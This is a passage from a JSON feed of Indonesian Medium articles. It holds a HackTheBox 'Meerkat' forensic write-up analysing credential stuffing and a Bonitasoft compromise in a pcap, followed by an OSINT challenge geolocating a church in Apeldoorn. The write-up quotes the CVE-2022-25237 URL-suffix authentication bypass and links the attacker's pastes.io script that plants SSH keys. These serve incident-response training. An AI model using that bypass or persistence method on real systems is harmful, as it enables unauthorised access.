melihat informasi pada file tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fLp6dRYn4uEAkVPhkfVwGA.png\" </figure <p Terlihat Endpoint berisi script yang digunakan oleh Attacker dan kemudian saya mencoba akses Endpoint tersebut dan akan terlihat hasil seperti berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 XO264XatGzZybuTgTpFFpA.png\" </figure <p Terlihat pada URL : <a href=\"https://pastes.io/raw/hffgra4unv\" https://pastes.io/raw/hffgra4unv</a , dimana file “hffgra4unv” berisikan authorized keys SSH.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Iemz4nOKSGP6gOkgQOxCqw.png\" </figure <p Selanjutnya, untuk mencari <strong Mitre Technique</strong yang digunakan oleh Attacker untuk melakukan persistence pada host, kunjungi website <a href=\"https://attack.mitre.org/techniques/T1110/004/\" <strong MITRE ATT&amp;CK</strong </a <strong </strong dan pada form pencarian gunakan keyword “ssh”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 dbb1myxjTYd9PEfBV xImQ.png\" </figure <p Pada hasil pertama, terlihat bahwa <strong Sub Technique T1098.004 </strong sangat relevan dengan case ini.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 1DmH MAL6m0xUr3aeMrLFQ.png\" </figure <h4 LESSON LEARNED</h4 <ul <li Meng identifikasi serangan Credential Stuffing</li <li Melakukan riset CVE yang terdampak pada Bonitasoft</li <li Melakukan Packet Filtering dan menggunakan fitur Custom Column pada Wireshark</li </ul <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=359b51de8d39\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<h3 HTB — Sherlock — Meerkat</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/800/1 JnN26GK8MUnHt1i Vz74SA.png\" <figcaption HTB — Meerkat</figcaption </figure <h4 SHERLOCK SCENARIO:</h4 <blockquote As a f…",
    "description": "<h3 HTB — Sherlock — Meerkat</h3 <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/800/1 JnN26GK8MUnHt1i Vz74SA.png\" <figcaption HTB — Meerkat</figcaption </figure <h4 SHERLOCK SCENARIO:</h4 <blockquote As a fast growing startup, Forela have been utilising a business management platform. Unfortunately our documentation is scarce and our administrators aren’t the most security aware. As our new security provider we’d like you to take a look at some PCAP and log data we have exported to confirm if we have (or have not) been compromised.</blockquote <h4 CHALLENGE STEP BY STEP</h4 <p Pada Challenge ini, diberikan 2 file.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/970/1 Zg YL9qTNkNAPatqMh2ofA.png\" </figure <p Untuk menjawab pertanyaan dari challenge ini, saya harus menganalisa file log <strong .pcap</strong tersebut.</p <p Disini saya menggunakan tools <strong wireshark </strong untuk melakukan analisa pcap traffic dan terlihat beberapa aktifitas request dengan menggunakan Method <strong POST </strong ke IP 172.31.6.44 . dengan endpoint &gt; /bonita/loginservice.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 TNH7dKAqTZQAil08XGtoGQ.png\" </figure <p Dari hasil analisa sementara, saya mendapatkan keyword “Bonita” dan disini saya mencoba untuk melakukan pencarian pada file .json bahwa Aplikasi yang dijalankan adalah Web Apps dari Bonitasoft.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 UW2JWnID8HYa1tLr3voSqQ.png\" </figure <p Kembali ke Wireshark, disini saya berasumsi bahwa Attacker melakukan Brute Force pada aplikasi tersebut. dimana terlihat beberapa Request dengan Response 401 yang mana menunjukkan “Unauthorized Access” seperti yang terlihat pada gambar berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/957/1 xQZ6LMrEmj3VIMfuipOJ4A.png\" <figcaption 1</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 aBcKcyrvi5c3OllcsDtzEQ.png\" <figcaption 2</figcaption </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/976/1 xtFe03fzPPBnXe3HQzTWBA.png\" <figcaption 3</figcaption </figure <p Pada hasil Capture diatas, saya mencoba Follow TCP Stream pada HTTP Request tersebut dan mendapati beberapa kredensial berbeda telah digunakan, dimana asumsi pertama saya benar bahwa attacker melakukan <strong <em brute force </em </strong login untuk mencoba mendapatkan akses login ke aplikasi.</p <p Kemudian saya mencoba melihat kembali pada file <strong .json</strong dan terlihat bahwa terdapat alert yang menunjukkan Default User Login Attempt pada web tersebut, yang mana masuk ke dalam <a href=\"https://nvd.nist.gov/vuln/detail/CVE 2022 25237\" <strong CVE 2022–25237</strong </a .</p <blockquote <strong CVE 2022–25237 Detail</strong </blockquote <blockquote Description:</blockquote <blockquote Bonita Web 2021.2 is affected by a authentication/authorization bypass vulnerability due to an overly broad exclude pattern used in the RestAPIAuthorizationFilter. By appending ;i18ntranslation or /../i18ntranslation/ to the end of a URL, users with no privileges can access privileged API endpoints. This can lead to remote code execution by abusing the privileged API actions.</blockquote <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 YauUua RPS27fSTXSsJ2BQ.png\" </figure <p Setelah membaca dokumentasi CVE , saya menemukan pernyataan bahwa penyerang menambahkan <strong ;i18ntranslation</strong atau <strong /../i18ntranslation/</strong di akhir URL.</p <p Kembali melanjutkan analisa pada file <strong .pcap</strong tadi, dimana pada setiap username yang Attacker coba input selalu menggunakan domain <a href=\"mailto:test@forela.co.id\" <em @forela.co.</em </a <em uk</em , yang mana itu meng indikasikan bahwa attacker menggunakan Email Company.</p <p Bisa disimpulkan Attacker Menggunakan teknik <strong Credential Stuffing</strong .</p <blockquote Credential stuffing adalah jenis serangan siber di mana penyerang mengumpulkan kredensial akun yang dicuri, biasanya terdiri dari daftar nama pengguna atau alamat email dan kata sandi yang sesuai, dan kemudian menggunakan daftar tersebut untuk mencoba masuk ke akun di situs web dan aplikasi yang berbeda.</blockquote <p Untuk melihat jumlah Request Attempt yang dilakukan oleh Attacker, saya menggunakan filter “urlencode form.key == username” pada wireshark, berikut hasilnya:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fr5KbSWNmx5J3kCXw9mKYQ.png\" </figure <p Untuk melihat value dari “username”, saya menggunakan fitur custom column pada wireshark.</p <p Klik edit → preferences → columns , kemudian set tipe column.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 2 PR22hClRHaTkNaPg7dDA.png\" </figure <p Terdapat 118 Log yang terlihat.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 bxm8cTEjitMlkfSQ8rTwoA.png\" </figure <p Pada log tersebut , terlihat ada beberapa request yang tidak perlu. disini saya melakukan filter kembali menggunakan “<strong urlencoded form.key == “username” &amp;&amp; !(http contains “install”</strong )”. Maka akan muncul seperti berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 c1XbrUvJ 5A3J4OiblkXiw.png\" </figure <p Terdapat total 59 Request, dimana masih ada beberapa duplicate request pada log tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 zDJG6HPnq47IyEIDzFYIFg.png\" </figure <p Pada tahap selanjutnya, saya harus mencari tau Requests Login Attempt yang berhasil dilakukan oleh attacker.<br Saya kembali melakukan filter untuk mencari Status Code yang bernilai dibawah 300 dengan menggunakan filter “<strong http.response.code &lt; 300</strong ”</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 cNHTDSZxmSOu0DFE z7jHA.png\" </figure <p Terlihat bahwa username: <a href=\"mailto:seb.broom@forela.co.uk\" seb.broom@forela.co.uk</a berhasil melakukan login ditandai dengan Response Code 204.</p <p Tahap selanjutnya saya harus mencari tau Text sharing yang digunakan oleh attacker, untuk menjawab ini saya mencoba melakukan filter kembali dengan menggunakan “<strong http.request.method</strong ”. Dan terlihat parameter yang digunakan oleh Attacker untuk melakukan RCE dimana Attacker menggunakan script yang disimpan di pastes.io</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 VQ cOYvXXuv4bYilrGS2Ow.png\" </figure <p Selanjutnya saya harus mencari tau public key yang digunakan oleh Attacker untuk mendapatkan Persistence pada target host.<br Untuk mendapatkan public key, saya harus meng ekspor objek HTTP dari paket sebelumnya.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/749/1 GOOrvHQQySEJBXQt2FEIqg.png\" </figure <p Ekspor dan Simpan file tersebut, kemudian gunakan command <strong file</strong untuk memastikan bahwa yang telah di eksport merupakan file <strong .json</strong , selanjutnya gunakan command <strong strings</strong untuk melihat informasi pada file tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 fLp6dRYn4uEAkVPhkfVwGA.png\" </figure <p Terlihat Endpoint berisi script yang digunakan oleh Attacker dan kemudian saya mencoba akses Endpoint tersebut dan akan terlihat hasil seperti berikut:</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 XO264XatGzZybuTgTpFFpA.png\" </figure <p Terlihat pada URL : <a href=\"https://pastes.io/raw/hffgra4unv\" https://pastes.io/raw/hffgra4unv</a , dimana file “hffgra4unv” berisikan authorized keys SSH.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Iemz4nOKSGP6gOkgQOxCqw.png\" </figure <p Selanjutnya, untuk mencari <strong Mitre Technique</strong yang digunakan oleh Attacker untuk melakukan persistence pada host, kunjungi website <a href=\"https://attack.mitre.org/techniques/T1110/004/\" <strong MITRE ATT&amp;CK</strong </a <strong </strong dan pada form pencarian gunakan keyword “ssh”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 dbb1myxjTYd9PEfBV xImQ.png\" </figure <p Pada hasil pertama, terlihat bahwa <strong Sub Technique T1098.004 </strong sangat relevan dengan case ini.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 1DmH MAL6m0xUr3aeMrLFQ.png\" </figure <h4 LESSON LEARNED</h4 <ul <li Meng identifikasi serangan Credential Stuffing</li <li Melakukan riset CVE yang terdampak pada Bonitasoft</li <li Melakukan Packet Filtering dan menggunakan fitur Custom Column pada Wireshark</li </ul <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=359b51de8d39\" width=\"1\" height=\"1\" alt=\"\"",
    "tags": [
      "incident-response",
      "hackthebox-challenge",
      "network-analysis"
    ],
    "category": "Medium Article",
    "type": "medium",
    "url": "https://angganvryn.medium.com/htb-sherlock-meerkat-359b51de8d39?source=rss-e8b9da247cdf------2",
    "publishedDate": "2023-12-04 18:52:04",
    "updatedAt": "2023-12-04 18:52:04",
    "readingTime": 5,
    "cover": null
  },
  {
    "id": "https://medium.com/p/6313e8d9f067",
    "slug": "https://medium.com/p/6313e8d9f067",
    "title": "OSINT Challenge — Deep Geo-Analysis using Imagery Intelligence Technique",
    "content": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/817/1 J9bltB qyybNtmuCqSSeuA.png\" </figure <blockquote OSINT atau <em Open Source Intelligence</em adalah metodologi yang memanfaatkan informasi yang tersedia untuk umum untuk pemantauan maupun proses investigasi. Salah satu aspek OSINT yang menarik adalah geo analisis melalui gambar, yang sering disebut sebagai Imagery Intelligence (IMINT).</blockquote <blockquote OSINT telah mendefinisikan kembali seni penyelidikan/investigasi. Dengan memanfaatkan data yang dapat diakses oleh siapa saja yang memiliki koneksi internet, teknik OSINT memiliki potensi untuk mengungkap permata tersembunyi yang mungkin terlewatkan oleh metode tradisional. Dalam konteks tantangan ini, saya memanfaatkan kekuatan OSINT untuk mengekstrak informasi berharga dari gambar — sebuah praktik yang mencerminkan skenario dunia nyata di mana penyelidik, jurnalis, dan peneliti harus menyatukan informasi untuk mengungkap kebenaran.</blockquote <blockquote Secara singkat, IMINT adalah jenis intelijen yang digunakan untuk mengumpulkan informasi tentang objek atau area melalui gambar, dimana strategi ini bertujuan untuk menggali lebih dalam dari sekadar permukaan informasi yang dapat diperoleh dari OSINT. Dengan menggunakan IMINT, kita dapat memperoleh informasi yang lebih detail dan akurat tentang suatu lokasi atau target.</blockquote <h4 CHALLENGE</h4 <p Ketika Robert (@osintaclaus) memposting tantangannya di Twitter untuk memecahkan kode Geolokasi gambar yang penuh teka teki menggunakan teknik <strong OSINT </strong dan <strong IMINT</strong . Disini saya mencoba untuk menerima tantangan tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/596/1 tx86nBC7sMi8pvh6ASdUiw.png\" </figure <p Pertama tama saya coba untuk mendownload gambar tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 dCDYEdnWotIitvC2 9QedQ.jpeg\" </figure <p Setelah mengunduh gambar, saya memulai analisis terperinci untuk mengungkap potensi petunjuk yang mengisyaratkan asal usulnya. Khususnya, perhatian saya langsung tertuju pada sebuah gereja yang digambarkan diatas. Bagian tengah arsitektur ini dibuat menggunakan batu bata merah yang khas dan menampilkan desain kaca mencolok yang menghiasi struktur gereja dengan cantik dan ada sebuah menara yang berdiri tegak.</p <p Di antara detail yang rumit, saya mengamati bahwa bagian luar gereja menampilkan jendela merah berbingkai putih yang diposisikan di atas bangunan. Fitur arsitektur ini selaras dengan gaya khas yang sering ditemukan di gereja gereja. Namun, di luar daya tarik visualnya, gambar tersebut tampaknya menyimpan petunjuk geografis yang matang untuk ditafsirkan.</p <p Pada saat saya mencoba menganalisa lebih dalam, saya menemukan tanda biru cerah yang menampilkan kata kata “<em Stationsstraat</em .” Rambu ini bukan hanya elemen visual, itu berfungsi sebagai petunjuk penting untuk mengungkap lokasi gambar. Dari perspektif linguistik, saya melihat bahwa <em “Stationsstraat”</em berasal dari kata <strong Belanda </strong <em “straat”</em yang diterjemahkan menjadi <em “jalan.”</em Hubungan linguistik ini merupakan indikasi kuat bahwa lokasi gereja tersebut terdapat di Negara <strong Belanda</strong . Dan selanjutnya, tanda lain dalam gambar berisi kata Belanda “<em uitgezonderd</em ” yang disertai gambar sepeda, yang berarti “<em Kecuali</em ” dalam bahasa Inggris. Jembatan linguistik ini memberikan konteks yang berharga, menyiratkan pembatasan atau izin khusus dalam konteks Bahasa <strong Belanda</strong .</p <p Dari hasil pengamatan dari segi arsitektur bangunan dan dari hasil analisa sementara diatas bahwa gereja tersebut bisa saja terletak di sekitar Benua Eropa. Namun, dimana letak akuratnya? mari kita lakukan analisa lebih lanjut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/448/1 R pAuNNFOtN36yBRV2KrMA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/455/1 1hhJ8iCBbBhZpN1CbtnvpA.png\" </figure <p Saya telah mencoba untuk mencari informasi nama jalan tersebut di berbagai sumber dan saya mendapatkan bahwa <em Stationsstraat</em adalah nama jalan yang umum, baik di Negara <strong Belanda </strong maupun <strong Belgia</strong . Ejaan <em Stationstraat </em juga digunakan disana.</p <p Sekilas pada hasil <strong Wikipedia </strong menggarisbawahi keberadaan banyak kota di <strong Belgia </strong dan <strong Belanda </strong yang memiliki nama jalan “<em Stationsstraat</em ”. Yang mengejutkan saya, nama yang ada di mana mana ini telah ditemukan di sekitar 30 kota. Cakupan yang luas ini membuat tantangan yang cukup besar dalam hal penyelidikan dan investigasi. Kebutuhan untuk melakukan filter dengan cermat untuk mencari sejumlah besar lokasi yang potensial ini sangat menantang dan sekaligus menarik.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/888/1 Iw5EbYWYZLI1Z3OMM lzdA.png\" </figure <p Temuan pada <strong Wikipedia </strong mengarahkan saya ke <strong Belgia </strong dan <strong Belanda</strong . Namun, jika kita harus analisa 30 kota di kedua negara itu semakin menyulitkan pencarian. Jadi saya memutuskan untuk menggunakan teknik <strong <em Reverse Image</em </strong untuk mempersempit pencarian dan mempersingkat proses penyelidikan.</p <p Kehebatan teknik <strong <em Reverse Image</em </strong terletak pada kemampuannya untuk mereferensi dengan metode Cross Image menggunakan database visual yang sangat luas dari seluruh web. Proses ini memiliki potensi secara signifikan dalam mempersempit kota kota yang menuntut perhatian lebih dekat. Meskipun tantangannya tetap rumit, Pencarian dengan metode <strong <em Reverse Image</em </strong sangat cepat untuk memecahkan teka teki ini.</p <p Untuk mempersempit lokasi, saya menggunakan “Google Lens,” alat pemindai gambar dalam ekosistem Google. Dengan menggunakan “Google Lens,” saya memasukkan gambar ke dalam sistem, bertujuan untuk menemukan kecocokan atau gambar serupa secara online. Pendekatan ini menggabungkan analisis manusia dengan bantuan AI, secara efektif memajukan penyelidikan. Integrasi metode tradisional dan inovasi teknologi mencontohkan esensi OSINT</p <p “Google Lens” memberikan berbagai kecocokan terkait gereja. Namun, untuk menyempurnakan pencarian, saya menambahkan “<strong Belanda </strong + <strong Belgia</strong ” ke kueri. Modifikasi ini bertujuan untuk mengarahkan pencarian ke gereja gereja yang memiliki kesamaan visual di kedua negara. Tujuannya adalah untuk menunjuk karakteristik arsitektur, meningkatkan kemungkinan mengidentifikasi lokasi yang sulit dipahami. Pendekatan terfokus ini menunjukkan perpaduan antara bantuan teknologi dan kecermatan investigasi, yang melambangkan sifat dinamis dari strategi OSINT.</p <p Di antara berbagai hasil, gambar yang sangat mirip menarik perhatian saya — itu cocok dengan kata “<em MariaKerk</em ” dari <strong Wikidata</strong . Penemuan ini menandai tonggak penting dalam penyelidikan. Keselarasan elemen visual antara gambar dan gambar “<em MariaKerk</em ” menunjukkan kemungkinan hubungan ke lokasi yang sulit dipahami.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 tIwGerm5ERelKeheKu6Oog.png\" </figure <p Setelah meng klik gambarnya, saya diarahkan ke situs web <strong Wikidata</strong . Gambar tersebut dikaitkan dengan “<em Mariakerk</em ,” sebuah gereja yang berada di kota <strong Apeldoorn </strong di <strong Belanda</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 L2xJ803poC n Ijsd1VK8g.png\" </figure <p Berikut gambar ukuran aslinya.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 5DHleWocGAZ3YMmTFutFAA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/322/1 2IkBQY8rxQCjfZldrolksQ.png\" </figure <p Saya memutuskan untuk googling kembali agar mendapatkan lebih banyak informasi tentang kota tersebut. <strong Apeldoorn </strong adalah kota kecil di <strong Belanda</strong yang berjarak sekitar 1 jam perjalanan dari ibu kota <strong Amsterdam</strong </p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 B yAk3i2JYbAF 6Xbd0KpQ.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 G0g5IXpQdg4PkraYSMy48w.png\" </figure <p Saya memutuskan untuk melihat semua daftar Gereja yang ada di kota <strong Apeldoorn</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 tE4TwD6zIEkfM QdL2cjxg.png\" </figure <p Saya menemukan sebuah situs yang memuat list daftar Gereja yang ada di kota tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/855/1 mFFCiaum9t8sBKue3IsR8Q.png\" </figure <p Disini saya mencoba membuka situs web resmi “<strong Badan Warisan Budaya Belanda</strong ” <strong (Rijksdienst voor het Cultureel Erfgoed)</strong untuk memeriksa Gereja yang masuk kedalam itus Warisan Budaya di <strong Belanda</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 4ryRtvKVh1F3CHswSsqpcQ.png\" </figure <p Untuk mencari informasi selanjutnya, saya menggunakan teknik <em Google Dorks</em untuk menemukan detail lokasi dan nama gereja dalam bahasa Belanda dengan kata “Kerk” di dalam situs resmi “<strong Badan Warisan Budaya Belanda</strong ”.</p <pre inurl:monumentenregister.cultureelerfgoed.nl/ + intext:Kerk</pre <p Dan hasilnya mendapatkan beberapa informasi berikut :</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 HzPSnd79uJ4ZUlIFwPe03w.png\" </figure <p Hal itu memberi saya rincian dan informasi lengkap tentang gereja tersebut dan juga lokasinya dari situs web <em “The Catholic Directory”</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 DIRLBetVsvnESwvkykWmIA.png\" </figure <p Dengan menggunakan Google Dorks kembali, saya juga menemukan file PDF dengan informasi terkait gereja potensial tersebut. termasuk Nomor monumen, tanggal pendaftaran, lokasi, jenis monumen (gereja), dan lain lain.</p <p <a href=\"https://monumentenregister.cultureelerfgoed.nl/monumenten/pdf/8161\" LINK PDF!</a </p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/692/1 RDy1HUt5S4yP5vfpP9Z5 g.png\" </figure <p Saya menemukan bahwa gereja ini memiliki nama resmi selain “<em Mariakerk</em ” — nama resminya adalah “<em Onze Lieve Vrouwe ten Hemelopnemingkerk</em ”. Kemudian saya memutuskan untuk mencari di Google dan menemukan lebih dari 20.000 hasil yang mana itu sangat banyak sekali …</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 EMkwvNzzcFQEgpoEWW cCw.png\" </figure <p Saya telah memutuskan untuk melakukan pencarian saya melalui Google Dorks dan menambahkan perintah “location:”, yang memberi saya 5 hasil. Seperti yang dapat Anda lihat, nama gereja dan juga alamat dari situs web <em “The Catholic Directory”</em .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 90t1UYS156mUQBL3UlJmKA.png\" </figure <p Gambar yang sama dari <strong Wikidata</strong .</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/797/1 B2J864KwncoCQ9DnQBraew.png\" </figure <p Berikut adalah kemungkinan lokasi gereja dengan nama baru yang saya temukan, dan gambar yang sama dari situs web <strong Wikidata</strong yang sebelumnya memberi saya nama “<em Mariakerk</em ”.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 qUkJgqmYoqloCnHKf SJpg.png\" </figure <p Dengan penyelidikan OSINT yang membuahkan hasil, saya mengalihkan perhatian saya pada semua temuan berharga yang dikumpulkan dari berbagai sumber. Namun, hasil sebenernya dari proses menyelesaikan challenge ini terletak pada fase menggali informasi fisik dari lokasi tersebut.</p <p Fokus saya beralih ke alamat berikut<strong : “Hoofdstraat 18, 7311 KB Apeldoorn, Belanda”. </strong Dengan berbekal <strong Google Earth PRO</strong , sebuah alat yang mencakup citra satelit 3D, peta, dan tampilan jalan. Kemampuan <strong Google Earth PRO</strong terbukti sangat berharga, menawarkan eksplorasi multidimensi dari lokasi tersebut.</p <p Dengan <strong Google Earth PRO</strong memungkinkan saya untuk tidak hanya menyaksikan lokasi tetapi juga melihatnya dalam konteks lingkungannya. Perspektif holistik ini merangkum esensi OSINT — mengubah petunjuk digital menjadi pengetahuan nyata melalui perpaduan teknologi dan hasil investigasi.</p <p Puncak dari challenge ini bukan hanya identifikasi lokasi gereja, itu adalah sintesis data, teknologi, dan eksplorasi saja. Kemampuan untuk menjembatani dunia virtual dan fisik melalui alat alat seperti <strong Google Earth PRO</strong mewujudkan inti dari OSINT.</p <p Berikut hasil akhir dari analisis Gambar pada challenges OSINT kali ini.</p <pre Hoofdstraat 18, 7311 KB Apeldoorn, Belanda</pre <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 Vhd4fUjaYJW kmJf8PHrzg.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 NAjuS 3TEwsaVR3LDYBTfA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 FQRPDaohQ056jMDy5fbfiQ.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 IxXYE2DzyOrcS1QQuJKSCg.png\" </figure <p Sekian dan Terima kasih…</p <img src=\"https://medium.com/ /stat?event=post.clientViewed&amp;referrerSource=full rss&amp;postId=6313e8d9f067\" width=\"1\" height=\"1\" alt=\"\"",
    "excerpt": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/817/1 J9bltB qyybNtmuCqSSeuA.png\" </figure <blockquote OSINT atau <em Open Source Intelligence</em adalah metodologi yang memanfaatkan informasi yang tersedia…",
    "description": "<figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/817/1 J9bltB qyybNtmuCqSSeuA.png\" </figure <blockquote OSINT atau <em Open Source Intelligence</em adalah metodologi yang memanfaatkan informasi yang tersedia untuk umum untuk pemantauan maupun proses investigasi. Salah satu aspek OSINT yang menarik adalah geo analisis melalui gambar, yang sering disebut sebagai Imagery Intelligence (IMINT).</blockquote <blockquote OSINT telah mendefinisikan kembali seni penyelidikan/investigasi. Dengan memanfaatkan data yang dapat diakses oleh siapa saja yang memiliki koneksi internet, teknik OSINT memiliki potensi untuk mengungkap permata tersembunyi yang mungkin terlewatkan oleh metode tradisional. Dalam konteks tantangan ini, saya memanfaatkan kekuatan OSINT untuk mengekstrak informasi berharga dari gambar — sebuah praktik yang mencerminkan skenario dunia nyata di mana penyelidik, jurnalis, dan peneliti harus menyatukan informasi untuk mengungkap kebenaran.</blockquote <blockquote Secara singkat, IMINT adalah jenis intelijen yang digunakan untuk mengumpulkan informasi tentang objek atau area melalui gambar, dimana strategi ini bertujuan untuk menggali lebih dalam dari sekadar permukaan informasi yang dapat diperoleh dari OSINT. Dengan menggunakan IMINT, kita dapat memperoleh informasi yang lebih detail dan akurat tentang suatu lokasi atau target.</blockquote <h4 CHALLENGE</h4 <p Ketika Robert (@osintaclaus) memposting tantangannya di Twitter untuk memecahkan kode Geolokasi gambar yang penuh teka teki menggunakan teknik <strong OSINT </strong dan <strong IMINT</strong . Disini saya mencoba untuk menerima tantangan tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/596/1 tx86nBC7sMi8pvh6ASdUiw.png\" </figure <p Pertama tama saya coba untuk mendownload gambar tersebut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/1024/1 dCDYEdnWotIitvC2 9QedQ.jpeg\" </figure <p Setelah mengunduh gambar, saya memulai analisis terperinci untuk mengungkap potensi petunjuk yang mengisyaratkan asal usulnya. Khususnya, perhatian saya langsung tertuju pada sebuah gereja yang digambarkan diatas. Bagian tengah arsitektur ini dibuat menggunakan batu bata merah yang khas dan menampilkan desain kaca mencolok yang menghiasi struktur gereja dengan cantik dan ada sebuah menara yang berdiri tegak.</p <p Di antara detail yang rumit, saya mengamati bahwa bagian luar gereja menampilkan jendela merah berbingkai putih yang diposisikan di atas bangunan. Fitur arsitektur ini selaras dengan gaya khas yang sering ditemukan di gereja gereja. Namun, di luar daya tarik visualnya, gambar tersebut tampaknya menyimpan petunjuk geografis yang matang untuk ditafsirkan.</p <p Pada saat saya mencoba menganalisa lebih dalam, saya menemukan tanda biru cerah yang menampilkan kata kata “<em Stationsstraat</em .” Rambu ini bukan hanya elemen visual, itu berfungsi sebagai petunjuk penting untuk mengungkap lokasi gambar. Dari perspektif linguistik, saya melihat bahwa <em “Stationsstraat”</em berasal dari kata <strong Belanda </strong <em “straat”</em yang diterjemahkan menjadi <em “jalan.”</em Hubungan linguistik ini merupakan indikasi kuat bahwa lokasi gereja tersebut terdapat di Negara <strong Belanda</strong . Dan selanjutnya, tanda lain dalam gambar berisi kata Belanda “<em uitgezonderd</em ” yang disertai gambar sepeda, yang berarti “<em Kecuali</em ” dalam bahasa Inggris. Jembatan linguistik ini memberikan konteks yang berharga, menyiratkan pembatasan atau izin khusus dalam konteks Bahasa <strong Belanda</strong .</p <p Dari hasil pengamatan dari segi arsitektur bangunan dan dari hasil analisa sementara diatas bahwa gereja tersebut bisa saja terletak di sekitar Benua Eropa. Namun, dimana letak akuratnya? mari kita lakukan analisa lebih lanjut.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/448/1 R pAuNNFOtN36yBRV2KrMA.png\" </figure <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/455/1 1hhJ8iCBbBhZpN1CbtnvpA.png\" </figure <p Saya telah mencoba untuk mencari informasi nama jalan tersebut di berbagai sumber dan saya mendapatkan bahwa <em Stationsstraat</em adalah nama jalan yang umum, baik di Negara <strong Belanda </strong maupun <strong Belgia</strong . Ejaan <em Stationstraat </em juga digunakan disana.</p <p Sekilas pada hasil <strong Wikipedia </strong menggarisbawahi keberadaan banyak kota di <strong Belgia </strong dan <strong Belanda </strong yang memiliki nama jalan “<em Stationsstraat</em ”. Yang mengejutkan saya, nama yang ada di mana mana ini telah ditemukan di sekitar 30 kota. Cakupan yang luas ini membuat tantangan yang cukup besar dalam hal penyelidikan dan investigasi. Kebutuhan untuk melakukan filter dengan cermat untuk mencari sejumlah besar lokasi yang potensial ini sangat menantang dan sekaligus menarik.</p <figure <img alt=\"\" src=\"https://cdn images 1.medium.com/max/888/1 Iw5EbYWYZLI1Z3OMM lzdA.png\" </figure <p Temuan pada <strong Wikipedia </strong mengarahkan saya ke <strong Belgia </strong dan <strong Belanda</strong . Namun, jika kita harus analisa 30 kota di kedua negara itu semakin menyulitkan pencarian. Jadi saya memutuskan untuk menggunakan teknik <strong <em Reverse Image</em </strong untuk mempersempit pencarian dan mempersingkat proses penyelidikan.</p <p Kehebatan teknik <strong <em Reverse Image</em </strong terletak pada kemampuannya untuk mereferensi dengan metode Cross Image menggunakan database visual yang sangat luas dari seluruh web. Proses ini memiliki potensi secara signifikan dalam mempersempit kota kota yang menuntut perhatian lebih dekat. Meskipun tantangannya tetap rumit, Pencarian dengan metode <strong <em Reverse Image</em </strong sangat cepat untuk memecahkan teka teki ini.</p 